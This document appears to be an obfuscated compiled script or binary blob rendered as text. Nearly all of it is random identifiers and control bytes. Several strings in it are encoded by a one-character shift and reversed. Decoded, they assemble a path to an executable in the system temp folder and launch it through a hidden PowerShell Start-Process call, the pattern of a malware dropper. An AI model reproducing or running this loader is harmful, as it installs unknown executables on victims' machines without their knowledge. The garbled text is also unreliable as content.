 iGnCKrikrWGIp ¬  $ , ' ®  ¤¬ § e     ¶  OIIcfUjTtRsdEOw ¶  OII ¶  YuVXQy$ P ' °  ¤¬ ] e     ¶  LbYTVejdCOUJkmLe¶  LbY ¶  dEtR$ P ' ²    ¤¬ 5 e     ¶  YzcXvFflZjOC¶  Yzc ¶   odjEzTs $ P ' ´  ¶  yhLRotGJMpyaGuIgiyy $ 6 ' ¶        ¤¬ ¢ e     ¶  fCUPCVVICSxACId $ Z ' ¸  ¶  KeRhESTZpXeaQYbO$ B ' º  ¶  qhPSAJrMYpGA$ T ' ¼      ¬ 	 $ 0 ' ¾    ¤¬ M	 e     ¶  rzMIACYmiAD $ T ' À      ¶  lzrKbhSInKXUAbXrB ¶  lzrK¶  gMWsM $ P ' Â        ¤¬ ô e     ¶ 
 HnsgiPvWmn$ 6 ' Ä¶ 
 kOXtiLqBHP¬  $ , ' Æ    ¶  fFsPIOazbCQfqUjdd $ B ' È  ¤¬  e     ¶  VqqdWIYyRbIvQXVeq $ 6 ' Ê¶  lAlOqIAgUXxcgrUCo ¬  $ Ü  ' Ì    ¶ 
 qaELjOBdDDemU $ Z ' Î      ¤¬   e       Ò  ¶¬ - ¬   $ ¼ $ P ' Ð        ¤¬   e       Ô¬  ¬ 3  œ       ¶  MwsqULfCAHymqxeUkY¶  Mws ¶  TIxD$ P ' Ö¶  MwsqULfCAHymqxeUkY$ B ' Ö¶ 
 OTDTEfsqMzTjF ¶  OTDT¶   cDQzldl $ P ' Ø¶ 
 OTDTEfsqMzTjF $ B ' Ø    k ÿÿð3  ¶  TmeapshntasMvcWGu ¬  $ Ü  ' Ú      ¤¬  e     ¶  wGmjWAUWAHXESMmsxUJ ¬  $ , ' Ü  ¶ 
 GjfHTidRQUcQF ¬   $ > ' Þ  ¤¬ ñ e     ¶  jhifUzpISVJlloR ¬  $ , ' à        ¤¬ Ó
 e       â¬ È ¬ e  œ       ¶ 
 xGjPMVwrenWSo ¶  xGjP¶   IbaqeWI $ P ' ä¶ 
 xGjPMVwrenWSo $ B ' ä    ¶ 
 VcuXLciAkMFUE ¶  Vcu ¶   xFjyIJW $ P ' æ¶ 
 VcuXLciAkMFUE $ B ' æ    k ÿÿh2  ¶  rrJOsfbDYozrnGG $ 6 ' è    ¤¬ á e     ¶  JpeffeWsara $ Z ' ê        ¤¬  e     ¶  RUbXBvoJXSXWnZ$ Z ' ì    ¬ 	 $ 0 ' î    ¤¬ © e         f¬ i ¬   $ ¼ ¬ j ¬ 
  $ ¼  ¬ ~ ¬ 
  $ ¼  ¬ n ¬   $ ¼  $ P ' Ò  ¤¬ 1 e       Ð ¬   A@ð   ¤¬  e     ¶  tnxytbHGpKHdGGaAAY$ Z ' ò¶  JFtWDCYKTAGlYqLDKz$ B ' ô  ¤¬ ü e     ¬   $ 0 ' ö  ¶  AwiyhrlOsGcawOgWE $ B ' ø  ¤¬ s e     ¶  hyDQkakAdIH $ T ' ú      ¶ 
 YDUSTeUmqM$ B ' ü  ¤¬ ö e     ¶  OuOuHWhmxKEMCOCa$ T ' þ  ¶  sRYukzjKiIHvKOH $ B '      ¤¬ Ô e     ¶  hvaTJcCjzOCt$ B '         ¤¬  e     ¶ 
 wJyqGrDyiSzfU ¬  $ Ü  '   ¤¬ u e     ¬  $ 0 '     ¤¬ ï	 e     ¬  $ 0 '     ¤¬ ”  e     ¶  ogJKwVFJATkfFD$ 6 ' 
    ¶  WGsOPYqCFazCrbzbTXk ¬  $ Ü  '     ¤¬ ©	 e     ¶  PMRqcqVZMsD ¬  $ Ü  '   ¶  ezyDgFuDELPsLJ$ T '       ¤¬ b e     ¶  tIsudJTUxYQmKTSrb $ T ' ¶  DzOcfPTicfgoxQC ¶  DzOc¶  xtmA$ P '     ¤¬ ^ e     ¬  $ 0 '     ¤¬ D e     ¶  HSxPMcUYfSReZxpkQy$ Z ' ¶  bcmMdEncnVtUERHhHlX ¬   $ > '   ¶ 
 oqXnwjwyBnabq ¬  ¬  $ ú  '       ¤¬ 
 e     ¶  vicEqaumHgfWSmlUBU$ Z '    ¬ ÷ ¬ #  œ       ¶ 
 iLnJaWownFquJ ¶  iLn ¶   SMnlMmo $ P ' "¶ 
 iLnJaWownFquJ $ B ' "    ¶  EiABtnjrEgTSKspY¶  EiA ¶  UMzVY $ P ' $¶  EiABtnjrEgTSKspY$ B ' $  k ÿÿð,    ¤¬ 0 e     ¶  AKgKuSZCBKceoc¬  $ Ü  ' &¶  lXTmHMdeyvWFPGr ¬  $ Ü  ' (        ¤¬ Ú e     ¶  XXJAXqoqHMGGgmIQnT$ 6 ' *¶ 
 tpXlSbSIMfJyZ $ B ' ,    k ÿÿ@,  ¶ 
 pzjRzygyKX¬  $ , ' .    ÿ   ¤þ È       ÿ   0þ ¬   ¬ 4’       ¶ 
 ZymyUlYMlM¬  ¬   $ ú  ' 2¶ 
 iglwApMhQVlnA ¶  igl ¶  ttbg$ P ' 4    ¶  YFDmyECYkZygVeMMpuP ¬  $ Ü  ' 6    8¬  ¬ =  œ       ¶ 
 EXIskyEBDm¶  EXI ¶  OFnEUG$ P ' :      ¶ 
 EXIskyEBDm$ B ' :k ÿÿ+  ¶ 
 DRfqScXpwO¬   $ > ' <    ¶  MQCFSXfhnra $ B ' >      ¶  WxVFkWMtsKxYzywz¬  ¬  $ ú  ' @  ¶  BZmjbcDCFQmyBtl ¶  BZm ¶   suZcUsm $ P ' B      ¶  IaJDXnfkrEZEtwJV¬  $ , ' D      ¶  yFdGzjWHzcelvHbcqA¬  $ Ü  ' F    ¶  kPhUczyqHxSkhsFHI $ B ' H¶ 
 VXvFDMVsPo¬  $ , ' J    ¶ 
 MwDnjnxCAjFmR ¶  MwD ¶  YDOkj $ P ' L  ¶ 
 DdVcehEDeq¬   $ > ' N    ¶  QxEKhGpWqVwmuCsCc ¶  QxEK¶  TWpREf$ P ' P      ¬  $ 0 ' R  ¶ 
 JteArCnbht¬  $ Ü  ' T    ¶  HOzelooUkTbvxkBq$ T ' V  ¶  IwWPmPmBldnMGXtz¬  ¬  $ ú  ' X  ¬ 	 $ 0 ' Z  ¶  biGYDHeQemrrhAtvjF$ B ' \¶ 
 zYiaumqGvQ¬   $ > ' ^    ¶  iUKEFIwTunmKfEstzdO $ Z ' `      ¶  bITlOsqZPtwlStYlS $ Z ' b¶  GpxBChupUkce¶  GpxB¶  BulCe $ P ' d    ¬  $ 0 ' f  ¶ 
 sTgSAlCpUZXeP ¬  $ , ' h  j¬ 7 ¬ Ó  œ       ¶  GdHVsIvabLa ¶  GdH ¶  lCLaaC$ P ' l    ¶  GdHVsIvabLa $ B ' l      ¶  mTRaYRqrXhAXWdA ¶  mTR ¶  paXkdC$ P ' n¶  mTRaYRqrXhAXWdA $ B ' n  k ÿÿ0'  ¶  EICTPPOiDBdqCon ¬  ¬   $ ú  ' p  ÿ   0þ È         r¬  ¬ º  œ       ¶  sjoHJqPJIUn ¶  sjoH¶   aQJYJjM $ P ' t  ¶  sjoHJqPJIUn $ B ' t      ¶  ZriTWuLvIXEJ¶  Zri ¶  eizjD $ P ' v    ¶  ZriTWuLvIXEJ$ B ' v      k ÿÿ8&  ¶  UdqTbBSVMuvvqdSKVh$ B ' x¶ 
 SZQcjSJpfP$ 6 ' z¶  MlmKcnSuBIwRJwxzw ¬   $ > ' |    ¶ 
 HFtutUVSTfOoo ¬  $ Ü  ' ~¬   $ 0 ' €  ¶  eeUiJfuFYGExlvDyq $ T ' ‚¶ 
 GjATgAZqamVKo ¬   $ > ' „¶  qSneVdtInjz ¬  $ Ü  ' †  ¶  WPkdFcemiSoA¬  $ , ' ˆ  ÿ   Šþ ¬   ¬ \ ’       ¶  pHXSRIMOjDKSYsZ ¬  $ Ü  ' Œ      ¶  CQOQRMVjazZFmnwHPQC ¶  CQO ¶  sebRyZ$ P ' Ž    ¬   $ 0 '   ¶  gEggnxWUyMpzgudDp $ 6 ' ’¶  ehnUQZrlZvrRhlcjKp¬   $ > ' ”      –¬ r ¬ œ   œ       ¶  ozAdqmRCJUUH¶  ozAd¶  aWRMY $ P ' ˜    ¶  ozAdqmRCJUUH$ B ' ˜      k ÿÿè#  ¬   $ 0 ' š  ¶  beufWTKQwqwRrgH $ Z ' œ  ¶  uoloLzYAZPYQygOaUyO $ T ' ž      ¶  bnZUVKesDIB ¶  bnZ ¶   fwhtyrU $ P '    ¶  CeLjKpZSvGWSLk¶  CeLj¶  iAakE $ P ' ¢  ¶  pZJCfWfOuSJ ¬  ¬   $ ú  ' ¤      ¶  ZTsHLQJHMoeyTtYdgd¬   $ > ' ¦    ¬   $ 0 ' ¨  ¶  lwpWpBLuBQP $ 6 ' ª      ¶  tAiaFzghmVq ¬  $ Ü  ' ¬  ¶  ujSlHQhwpPuVIWHvB ¬  $ Ü  ' ®    ¶  wTMRiQjsGxc ¬  $ Ü  ' °  ¶  uYRWmTWBSfa $ T ' ²        ´¬ ' ¬ 
  œ       ¶  jcTpIxFaJYP ¶  jcTp¶   BhRxOeg $ P ' ¶  ¶  jcTpIxFaJYP $ B ' ¶      ¶  ornrZgrvpOSatfCHmyT ¶  orn ¶  xplO$ P ' ¸      ¶  ornrZgrvpOSatfCHmyT $ B ' ¸      k ÿÿX!  ¬  $ 0 ' º  ¶  CwaunJwTVvpcDdrprs$ Z ' ¼¶  bPoOLpaTfICfALeHF $ T ' ¾ÿ   Šþ È       ¶  LUSEOcDWsWmVQxUrV ¬  ¬  $ ú  ' À¶  MttxiOvyBDkiME¬  ¬   $ ú  ' Â      Ä¬ ³ ¬ 
  œ       ¶  pciDbPRVhAWpZMf ¶  pciD¶   IycOfgl $ P ' Æ      ¶  pciDbPRVhAWpZMf $ B ' Æ  ¶ 
 GPfJxtTaXMDHc ¶  GPfJ¶   tPOvyUj $ P ' È¶ 
 GPfJxtTaXMDHc $ B ' È    k ÿÿà  ¶  uCiUZRoFejhJDf¶  uCiU¶  vZsB$ P ' Ê    ¶  taypYDIQcaIS¬  $ Ü  ' Ì  ¶  YKrFKiDCdJYnjE¬  ¬   $ ú  ' Î    ¶  pjSgFmtKjDaehyyhYXf $ B ' Ð        Ò¬  ¬   œ       ¶  MJFqtxpDpTpXAulmiXR ¶  MJFq¶  peDD$ P ' Ô      ¶  MJFqtxpDpTpXAulmiXR $ B ' Ô      k ÿÿÀ  ¶ 
 jsByZifkbLLfi $ T ' Ö    ¶  mtTitcBwJpxRiotEOgE ¶  mtTi¶   toPmuSO $ P ' Ø  ¬  $ 0 ' Ú    Ü¬ :	 ô     ¶  VEbgebohXAwRxKkZU $ B ' Þ¶ 
 WqvTEGqCzIRdt ¬   $ > ' à¶ 
 molmklrVXF$ 6 ' â¶  zKsIPrFODUfSewRgOJ$ Z ' ä¶  rWhgIIvSglfx¬   $ > ' æ  ¬   $ 0 ' è  ¶  QUGOBKwOQHk ¬  $ , ' ê  ¶  YqYUhcSbaTgJ¬   $ > ' ì  ¶  iVFXCsQQcyHwcM$ Z ' î    ¶  iZeKFGpihvupQABnFYg ¬  ¬  $ ú  ' ð      ¶  mDqLGyCeCGdUfj$ T ' ò      ô¬ ö ¬    œ       ¶  iqFLvzweZbpwkUPHWbL ¶  iqF ¶   lWtBauT $ P ' ö  ¶  iqFLvzweZbpwkUPHWbL $ B ' ö      ¶  DMXXSBmUtVrIQx¶  DMX ¶  XTEF$ P ' ø    ¶  DMXXSBmUtVrIQx$ B ' ø    k ÿÿ   ¶  ZpYEYJWSgtTRDc¶  ZpYE¶   ZOFVmId $ P ' ú¶  dfCgoqwyLitCbzmg¬  $ , ' ü      ¶  GGwdmoMoPHmxuPQFIc¬   $ > ' þ    ¶  eVksvQLoqmZyEiKwvhF ¬  $ Ü  '     ¬  $ 0 '       ¬  ¬ Ç  œ       ¶  pLLWQZkFRwP ¶  pLLW¶  RMmf$ P '        ¶  pLLWQZkFRwP $ B '        k ÿÿø  ¶  eGnYymWVSfAyXVVKs ¬  $ Ü  '      ¶  rvuFWFjorhdFlzY ¬  $ Ü  ' 
       ¬   $ 0 '    ¶  uvIwtYgXzcfdnWd ¬  $ Ü  '        ¶  umySJZjCecJlbWQrTf$ 6 '  ¶ 
 yDLEYmvbnR$ T '  ¬  $ 0 '    ¶  XHVjPjdLQgpZEyriZmz ¬   $ > '    ¶ 
 UbrVLjCUOZ$ 6 '     ¬ Ë ¬ Ñ  œ       ¶  yrADtKUVZUHvtV¶  yrAD¶  TGreFF$ P '    ¶  yrADtKUVZUHvtV$ B '      ¶ 
 dvXnJAMVQevAs ¶  dvX ¶  vOuZ$ P '      ¶ 
 dvXnJAMVQevAs $ B '      k ÿÿ(  ¶  VksPumoXzwWP¶  VksP¶   ZVcKqqr $ P '       Ü¬   ' Ü  ó ÿÿà  ¶  lIfDJsRqYlRE$ T ' "       ¶  ZeFDHGSFYPlk$ B ' $       ¶  mEGaQiTokwmuGaD ¬  ¬   $ ú  ' &   ¶  CshewdLJysBxiqj ¬  ¬  $ ú  ' (   ¶  ahvQJxOqlJoTblIi¶  ahvQ¶  tXrILz$ P ' * ¶ 
 wlokdtBZqWXaG $ Z ' ,     ¶ 
 JhaSkYmquBrmR ¶  JhaS¶  epkWd $ P ' .   ¶  CsMVeDCcSBEgcZ¬  $ Ü  ' 0 ¶  niqsfKmFVZzy$ T ' 2         4 ¬ ‚ ¬ I
  œ       ¶ 
 YqcdVGwpiYarw ¶  Yqcd¶  OebEFQ$ P ' 6   ¶ 
 YqcdVGwpiYarw $ B ' 6     k ÿÿ   ¶ 
 MEPpyBtOokFLQ ¬   $ > ' 8 ¶  FmeCmgZeyjokTz¬   $ > ' : ¶  QZHfPvWxhrkLXq$ T ' <       > ¬ Ç 	 ô     ¬  $ 0 ' @   ¶  ytyKKwJrCnapWXaIg $ B ' B ¶ 
 RtXhelVxvJTpi $ Z ' D     ¶  nIoXiEOMcKHzkbKjj $ Z ' F ¶  htMuKppIUxCgXqnZ¬   $ > ' H       ¬  $ 0 ' J   ¶ 
 QZpLuJdtkv$ T ' L ¶  cXBjzKwFcFKfBM¬   $ > ' N ¶ 
 OusfgHJkSHVxL $ B ' P       R ¬  ¬ J  œ       ¶  dcTzQXnZvjPHOp¶  dcT ¶  fJrE$ P ' T     ¶  dcTzQXnZvjPHOp$ B ' T     k ÿÿ@    V ¬ Î ¬ ·  œ       ¶  PPXwTgtybplKnWhiu ¶  PPXw¶  TaERFY$ P ' X       ¶  PPXwTgtybplKnWhiu $ B ' X ¶  PSGjwgceIymcYSZ ¶  PSG ¶  bpRuet$ P ' Z ¶  PSGjwgceIymcYSZ $ B ' Z   k ÿÿx  ¶ 
 BAFnDGUPcr¬  $ Ü  ' \     ¶  WKBvqdsWppwXsUdxflM ¶  WKB ¶  JDkmfw$ P ' ^     ¶  OZCamAfqwnlAxKDxv ¶  OZCa¶  tAdO$ P ' ` ¬  $ 0 ' b   ¶  POxVLRzjeXIRnscOEK¬  ¬  $ ú  ' d ¶  KdJfahhqPqV $ Z ' f       ¶  UVUTPSwdsqaoWSetD ¬  $ Ü  ' h     ¶  ASQysyiPfHRkgP¬  $ Ü  ' j ¶  mBihTlQGTDZmntCgAm¬  $ , ' l     ¬   $ 0 ' n     p ¬ ì ¬ K  œ       ¶  CEfpReoYdXagxEsB¶  CEfp¶  YpSHf $ P ' r ¶  CEfpReoYdXagxEsB$ B ' r   ¶  WwhWdgyOaWpgtK¶  WwhW¶  LFStF $ P ' t   ¶  WwhWdgyOaWpgtK$ B ' t     k ÿÿX  ¶  DDlZWZAACKr ¬  $ Ü  ' v     > ¬   ' >   ó ÿÿ   ¶ 
 GTdHBPFlBmWbd ¬   $ > ' x ¶  qgVSucHCSiXuIdJr$ 6 ' z   ¶  hTYiUCxRJUYZQkrtUbe $ T ' |       ¶ 
 qMkmIZkbEZiQk $ B ' ~     ¶  axbXmOILUfawkm¬  $ Ü  ' €   ‚ ¬ ¢ ¬ A  œ       ¶ 
 UknvmXeLGMyuJ ¶  Ukn ¶  ZEtmb $ P ' „   ¶ 
 UknvmXeLGMyuJ $ B ' „     ¶  XSliknlVwJKdXjA ¶  XSli¶   ZgVmhtQ $ P ' †       ¶  XSliknlVwJKdXjA $ B ' †   k ÿÿ°  ¶  fPGYxjPPigpZzJ$ T ' ˆ     ¶  FFIppecGjFzoIAGKRn$ B ' Š ¶ 
 SRzgseFZtBMSQ ¶  SRz ¶   Igaioar $ P ' Œ ¬  $ 0 ' Ž   ¶ 
 TdsakIDGYZ$ T '  ¶  dwgnkUoufDGizmpvIEV ¶  dwg ¶  TUTTqC$ P ' ’       ” ¬ Y ¬ Ò  œ       ¶  VHZYwvIjWDgqJoxA¶  VHZY¶   XrduEAS $ P ' –       ¶  VHZYwvIjWDgqJoxA$ B ' –   ¶  cfXOvfQfAlO ¶  cfXO¶  FKQt$ P ' ˜       ¶  cfXOvfQfAlO $ B ' ˜       k ÿÿ    š ¬ ° ¬   œ       ¶ 
 tywewCJZJP¶  tyw ¶  AfhGJT$ P ' œ       ¶ 
 tywewCJZJP$ B ' œ k ÿÿ°  o ÿÿ¨  –Ð     ÿ     þ ¬   ¬  ’       ¶  GQfdvzKQlLrIJFgspyX $ B ' ¢       ­ d ¬ _ ¬ 
  œ     ¶  DXVTJRxQUPlG¶  DXV ¶   IuBUJeK $ P ' ¤   ¶  DXVTJRxQUPlG$ B ' ¤       ¶ 
 EQSEBOTgiIbRm ¶  EQSE¶  bCexWz$ P ' ¦   ¶ 
 EQSEBOTgiIbRm $ B ' ¦     k ÿÿ 
  ¶  ExXHYZuiWPYfbjjz¶  ExX ¶  UiCvSd$ P ' ¢ ­ t ¬ ‘ ¬    œ     ¶ 
 EeBFUDOtxn¶  EeB ¶  RtZsoF$ P ' ¨       ¶ 
 EeBFUDOtxn$ B ' ¨ ¶  KrXLIPEpbDpd¶  KrXL¶  KMKvLm$ P ' ª     ¶  KrXLIPEpbDpd$ B ' ª       k ÿÿ¸  ¶  ipZVDfokuhhIIiIVdC¶  ipZV¶  ZXCA$ P ' ¢ ¶  LpIfHcsDfvUbHDlnJQ¶  LpI ¶  WVrOB $ P ' ¢       ¶  VoihTYEspfOdWSJuTY¶  Voi ¶  RGJMg $ P ' ¢       ¶  byyRzZWEBBoZnouTTcD ¶  byy ¶  nyrFV $ P ' ¢     ¶ 
 TskFKeloyg¶  TskF¶  SluZGL$ P ' ¢       ¶  wVbPJKwTJIODHpurzK¶  wVbP¶  lOrfZ $ P ' ¢       ¶ 
 RHaxFwDnWl$ B ' ¢ ¶  kWtzWDoGzFTqjCSp$ B ' ¢   ¶  srXUShYDEFa ¶  srXU¶  mIUEo $ P ' ¢     ¶  bFPiOHizZBfOlOO $ B ' ¢   ¶  zYnGbIcfVlQBeaVgmi¶  zYnG¶  JlZhud$ P ' ¢       ¶  DEJjtaqsXrcnpuQzLqn $ B ' ¢       ¶  turejVzQKioXlDTosQ¶  tur ¶   oXWXZOL $ P ' ¢     ­ ð ¬ l ¬ Å  œ     ¶  oMkdMRmVapc ¶  oMkd¶  MfWGzU$ P ' ¬     ¶  oMkdMRmVapc $ B ' ¬       ¶  qzdWdIXYYPrCZsIXeOf ¶  qzdW¶  uflhMQ$ P ' ®     ¶  qzdWdIXYYPrCZsIXeOf $ B ' ®       k ÿÿˆ	  ¶ 
 VpLUWycmpx$ B ' ¢ ¶  IISWgaBLauGiZrZ $ B ' ¢   ­ jå) ¬ ” ¬ T  œ     ¶  hLyTnjAlbALL¶  hLy ¶  Aeig$ P ' °       ¶  hLyTnjAlbALL$ B ' °       k ÿÿà  ¶  vRBTlsrZtUrtCtrDYS$ B ' ¢ ¶ 
 mqKHdugmUI¶  mqK ¶  rffFbL$ P ' ¢       ¶  MJoqhAjuQwX ¶  MJoq¶  urswR $ P ' ¢     ¶  SbhJwdUwJevK$ B ' ¢       ÿ     þ È       ÿ   ² þ ¬   ¬ ª ’       ¶  wDnVSXwnmoKtGhn $ B ' ´   ­ È-& ¬ ’ ¬ P  œ     ¶  bjuVKMtKsSg ¶  bjuV¶  lWOCwC$ P ' ¶     ¶  bjuVKMtKsSg $ B ' ¶       k ÿÿˆ   ¶  ckYvrIsFeejLOl¶  ckY ¶  KwYmsE$ P ' ´   ­ º" ¬ ¬ §  œ     ¶  yXilkfCyqjfhaMHCExx ¶  yXil¶  SPtXa $ P ' ¸     ¶  yXilkfCyqjfhaMHCExx $ B ' ¸       ¶  FTEbXDUCrnWfJyay¶  FTE ¶  gUqQM $ P ' º ¶  FTEbXDUCrnWfJyay$ B ' º   k ÿÿˆ  ­ %'& ¬ Ç ¬ ~  œ     ¶  VMfHeguarIFFRZLkD ¶  VMfH¶  Uasg$ P ' ¼ ¶  VMfHeguarIFFRZLkD $ B ' ¼ k ÿÿ  ¶  VSHPrdddLXdt¶  VSHP¶  AacoD $ P ' ´     ¶  ZCIDvMYLrxQUwYOk¶  ZCID¶  icqnY $ P ' ´ ¶ 
 qemenBRwFZ¶  qem ¶  ozkYc $ P ' ´       ¶  dmLEUXFDFkgKthyLB ¶  dmL ¶  SxAm$ P ' ´ ¶  mjFySuhTrpspill ¶  mjFy¶  vXgmZR$ P ' ´ ­ †“ ¬ : ¬    œ     ¶ 
 kxAJozViTHyzu ¶  kxAJ¶  hmBdcW$ P ' ¾   ¶ 
 kxAJozViTHyzu $ B ' ¾     k ÿÿ¸  ¶ 
 HAmgSWKyAbPjw $ B ' ´     ¶  JIzOOCXLpfwuBVgS$ B ' ´   ¶  pkqUVAHMKkmY¶  pkq ¶  tAdj$ P ' ´       ¶  ARALXEpdZAMTGtjVywE ¶  ARAL¶  OZvjgv$ P ' ´     ¶ 
 CEYEiRxzKL$ B ' ´ ¶  tweLCnuKOwTwBd$ B ' ´     ­ Ã… ¬  ¬ ì  œ     ¶  SrYYkZSSDEK ¶  SrYY¶   wzCkYSz $ P ' À   ¶  SrYYkZSSDEK $ B ' À       k ÿÿh  ¶  oitfxJazuOk $ B ' ´       ­ öm ¬ ý ¬   œ     ¶  YTnIMkUCaHBQEdHTmq¶  YTnI¶  xxCBHV$ P ' Â       ¶  YTnIMkUCaHBQEdHTmq$ B ' Â ¶ 
 lrFrPXpXADDBe ¶  lrF ¶   ChRBofP $ P ' Ä ¶ 
 lrFrPXpXADDBe $ B ' Ä     k ÿÿ€  ¶  TlgKDMxzrXpPTM¶  Tlg ¶  aDDk$ P ' ´     ¶  KSpHWWOoqgXP$ B ' ´       ¶  ibMTvKSEieDB$ B ' ´       ­ HO5 ¬ ß ¬ f  œ     ¶ 
 hxjyDgjhyiKja ¶  hxjy¶  gFSQW $ P ' Æ   ¶ 
 hxjyDgjhyiKja $ B ' Æ     ¶  BYTXiqSHgcnn¶  BYTX¶   DgxIMnn $ P ' È   ¶  BYTXiqSHgcnn$ B ' È       k ÿÿP  ¶  ctImRYuRGvpb¶  ctIm¶  phEPFk$ P ' ´     ÿ   ² þ È         Ê ¶ N TwbwHWuQIgYGeuSjrRNnjiuTXITSrTGhEJixDoZofwqYRGTGCCssryTztekfJYLxCoMv{TljHElBhm$ B $ B  ' Ê ¶  rfgAIKdTmhxTBCvtgkS $ B ' Ì       ÿ   Î þ ¬   ¬ j’       ¶  JIdUlYuoZeoOPoigH $ B ' Ð ¶  PViitupXZwdayERmO $ B ' Ð ¶  cRYdAJIGfVt ¶  cRY ¶  ghijEV$ P ' Ð ø  ­ ý§3 ¬ ÷ ¬ 0  œ     ¶ 
 WyOlFoEbyd¶  WyO ¶  lmJMFv$ P ' Ò       ¶ 
 WyOlFoEbyd$ B ' Ò k ÿÿ  ¶  zSUrIqhhFQUbZrHRMl¶  zSUr¶  DITkt $ P ' Ð       ¶  tdTgZppyuWn $ B ' Ð       ­ EÓ ¬ ( ¬   œ     ¶ 
 VqXnhlelqeUpb ¶  VqXn¶  qgbw$ P ' Ô     ¶ 
 VqXnhlelqeUpb $ B ' Ô     ¶  qaYtXniofQsdzKEOcp¶  qaYt¶  IQHdp $ P ' Ö       ¶  qaYtXniofQsdzKEOcp$ B ' Ö k ÿÿp~  ¶  dWVazRBdEmpRwqtdd $ B ' Ð ¶ 
 fhaJLXKZqI¶  fha ¶  lelp$ P ' Ð ¶  DCoBzcZEPHlTjE¶  DCo ¶  VKEXg $ P ' Ð   ¶  oVnVyGYLZWiFmafi¶  oVnV¶  QizY$ P ' Ð   ¶  vjyjaPntyJyQXSld¶  vjyj¶  WBpwS $ P ' Ð ¶  wjGLxcpBPXCUpam $ B ' Ð   ¶  vrluJUnptrUVtMo ¶  vrlu¶   nImLnFs $ P ' Ð       ¶  ddtzClscyrl $ B ' Ð       ¶ 
 izPgrSanrU$ B ' Ð ¶  zFEQsOaMIFxcLAnEBJ$ B ' Ð ¶ 
 tZBrzJbcZMOfL $ B ' Ð     ¶  yREtSWZYqMZaVAeeakL ¶  yRE ¶   RthhFhs $ P ' Ð   ¶  oGVKiPampSqQWFhIAK$ B ' Ð ¶  HsdWCIVGLSGTsbKcV ¶  Hsd ¶   sLWXawb $ P ' Ð     ¶ 
 CZotzuexzE$ B ' Ð ¶  hpQLYGipRLp $ B ' Ð       ¶ 
 xnZocIPdhE¶  xnZo¶   doXXQJo $ P ' Ð     ­ É½7 ¬  ¬ è  œ     ¶ 
 VMoihtvARX¶  VMoi¶  JKRYEK$ P ' Ø       ¶ 
 VMoihtvARX$ B ' Ø ¶  kvcXbBbLqsHVcIZcy ¶  kvcX¶  MPvJHh$ P ' Ú       ¶  kvcXbBbLqsHVcIZcy $ B ' Ú k ÿÿ{  ÿ   Î þ È         Ê ¶ X wFmbpCQHUREhQnXfsPxWJL}<*(fyf/XgIQ](,*)iubQqnfUufH;;^iubQ/PJ/nfutzT\)!iubqfmjG.!ttfdpsQ.$ B $ B  ' Ê       ¶ 
 KwwyUdqWmT¶  Kwwy¶  TGAloZ$ P ' Ì       ÿ   Ü þ ¬   ¬ ‡ ’       ¶  MgEJPCtHuZTH$ B ' Þ       ¶  hxXIbpKgEsQe$ B ' Þ       ¶  KxxkkBhxKqcRfkhE$ B ' Þ   ¶  DecfiqyerbwCKT$ B ' Þ     ¶  XoaIkFAHthPxjolCOnq ¶  Xoa ¶   BDsYQVB $ P ' Þ   ¶  CCZnFzsavVtqIAlgnX$ B ' Þ ­ ‘´ ¬ › ¬ 0  œ     ¶  gUdAXwdGUgwFUW¶  gUd ¶  aWhAG $ P ' à   ¶  gUdAXwdGUgwFUW$ B ' à     k ÿÿøx  ¶  bLoHeMikELpQKcZZyGx ¶  bLoH¶  XmjBs $ P ' Þ     ¶ 
 vIyRBMCHGLVIG $ B ' Þ     ¶  oIlrCAGygLox¶  oIl ¶  kbuh$ P ' Þ       ¶  UoTEMERREKPJaAZbRw$ B ' Þ ¶  kcborAeeBFTKqWTGkq$ B ' Þ ¶  mXaLamjmIYxnvYzn¶  mXa ¶  pubcRC$ P ' Þ ¶  lewgYyiucEYcGIvkpUn $ B ' Þ       ¶ 
 cDDBMVzSwtiox ¶  cDD ¶  kJPUA $ P ' Þ   ¶ 
 omwYDGiQpCrRM $ B ' Þ     ¶  BarheIqQOALwcKebzex ¶  Barh¶   GJXMIxj $ P ' Þ   ­ 
. ¬ ¬ `  œ     ¶ 
 hquzJxjRSD¶  hqu ¶  TTPzdB$ P ' â       ¶ 
 hquzJxjRSD$ B ' â ¶  oMJZuuGUwoJZig¶  oMJ ¶  ZhYG$ P ' ä     ¶  oMJZuuGUwoJZig$ B ' ä     k ÿÿ˜v  ­ µÄ* ¬  ¬ x  œ     ¶  mTHOgCskUaIKwKDA¶  mTH ¶  ptpmzz$ P ' æ ¶  mTHOgCskUaIKwKDA$ B ' æ   k ÿÿ(v  ¶ 
 PgEocpVBDf¶  PgE ¶  xPqSVq$ P ' Þ       ­ /6 ¬ « ¬ ÿ  œ     ¶  EHfRCsXxxXTU¶  EHf ¶  Dqxun $ P ' è     ¶  EHfRCsXxxXTU$ B ' è       ¶  IimywnkZRYpaVI¶  Iim ¶  lTcAP $ P ' ê   ¶  IimywnkZRYpaVI$ B ' ê     k ÿÿ8u  ­ !Ê9 ¬ © ¬ Õ  œ     ¶ 
 KKxypaErVB¶  KKxy¶  SYOg$ P ' ì ¶ 
 KKxypaErVB$ B ' ì ¶  isjLZBBsaXdbUrAIiEw ¶  isj ¶  XwQiyZ$ P ' î     ¶  isjLZBBsaXdbUrAIiEw $ B ' î       k ÿÿxt  ¶  MZUvAIpJjUfWfcoxeEc ¶  MZU ¶  uDcu$ P ' Þ       ¶  cwHsppMltbe $ B ' Þ       ­ ²P	 ¬ j ¬    œ     ¶  hTjUYvqvbaHl¶  hTj ¶  FMiOK $ P ' ð     ¶  hTjUYvqvbaHl$ B ' ð       k ÿÿ°s  ÿ   Ü þ È         Ê ¶ G usbuT!2!x.!fyf/mmfitsfxpq<**(fyf/XgIQ](,*)iubQqnfUufH;;^iubQ/PJ/nfutzT\ $ B $ B  ' Ê       ¶  jtJGLgttxwjliZthDxb ¶  jtJG¶  vtSUc $ P ' Ì     ÿ   ò þ ¬   ¬ ž ’       ¶  feQjbCOxQpsD$ B ' ô       ¶  zqCxzUMAeSXVqqlZ¶  zqCx¶  eWXaB $ P ' ô ¶  kzRywdsayVdBUojQ¶  kzRy¶  PcRB$ P ' ô   ­ „×6 ¬ × ¬ Ì  œ     ¶ 
 IoRGUysEswCgv ¶  IoR ¶  xBEkfp$ P ' ö   ¶ 
